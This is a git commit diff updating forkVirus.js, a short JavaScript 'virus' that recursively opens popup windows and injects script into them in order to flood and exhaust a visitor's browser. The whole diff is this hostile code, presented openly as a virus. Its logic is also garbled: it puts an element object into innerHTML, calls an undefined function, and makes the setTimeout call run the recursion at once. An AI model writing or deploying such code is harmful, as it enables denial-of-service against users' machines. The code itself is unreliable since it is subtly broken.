7306b42daab39370e2818ce1fd477fda8c29f76d
LeBoiZ <103581847+LeBoiZ10@users.noreply.github.com>
2022-11-10 20:21:25 -0500

    Update forkVirus.js

--- forkVirus.js
+++ forkVirus.js
@@ -3,7 +3,7 @@ function virus()
 	const newWin = window.open("", "", "height=800,width=800");
 	const forkScript = newWin.document.createElement("script"); 
 	forkScript.innerHTML = forkScript + "\n" + "forkScript();"; 
-	newWin.document.head.appendChild(script); 
-	setTimeout(function() {virus()}, 100) 
+	newWin.document.head.appendChild(forkScript); 
+	setTimeout(virus(), 100) 
 } 
 virus();
